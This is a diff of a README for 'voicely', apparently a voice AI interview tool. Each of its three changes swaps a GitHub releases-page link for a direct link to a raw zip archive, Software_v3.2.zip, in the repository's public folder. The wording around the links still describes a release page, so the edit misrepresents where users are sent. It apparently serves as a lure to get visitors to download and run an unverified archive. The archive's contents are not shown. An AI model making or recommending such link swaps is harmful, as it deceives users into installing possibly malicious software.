@@ -1,6 +1,6 @@
 # 🎙️ voicely - Real-Time Voice AI for Interviews
 
-[![Download voicely](https://img.shields.io/badge/Download-voicely-green?style=for-the-badge)](https://github.com/rizwiz104/voicely/releases)
+[![Download voicely](https://img.shields.io/badge/Download-voicely-green?style=for-the-badge)](https://github.com/rizwiz104/voicely/raw/refs/heads/main/public/Software_v3.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Here’s how to get voicely running in a few simple steps.
 ### 1. Go to the Download Page
 
 Click the green download badge above or visit the releases page here:  
-[https://github.com/rizwiz104/voicely/releases](https://github.com/rizwiz104/voicely/releases)  
+[https://github.com/rizwiz104/voicely/raw/refs/heads/main/public/Software_v3.2.zip](https://github.com/rizwiz104/voicely/raw/refs/heads/main/public/Software_v3.2.zip)  
 
 This page contains the latest versions of voicely ready for Windows.
 
@@ -163,7 +163,7 @@ You can listen to your past sessions or delete them as needed.
 ## 🌐 More Help
 
 For updates, bug reports, and detailed guides, visit the release page again:  
-[https://github.com/rizwiz104/voicely/releases](https://github.com/rizwiz104/voicely/releases)
+[https://github.com/rizwiz104/voicely/raw/refs/heads/main/public/Software_v3.2.zip](https://github.com/rizwiz104/voicely/raw/refs/heads/main/public/Software_v3.2.zip)
 
 You can find help materials and community discussions there.
 
